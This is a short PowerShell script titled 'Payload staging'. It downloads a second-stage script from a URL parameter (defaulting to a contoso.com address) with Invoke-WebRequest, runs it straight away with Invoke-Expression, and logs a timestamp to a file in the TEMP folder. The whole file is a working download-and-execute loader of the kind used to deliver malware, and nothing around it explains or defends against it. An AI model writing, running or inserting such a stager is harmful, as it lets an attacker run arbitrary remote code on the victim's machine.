<# Payload staging #>
[CmdletBinding()]
param(
    [string]$Stage2Url = "http://contoso.com/stage2.ps1",
    [int]$StageTimeout = 30
)
try { IEX (Invoke-WebRequest -Uri $Stage2Url -UseBasicParsing).Content; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append } catch { Write-Warning "Remote fetch failed" }
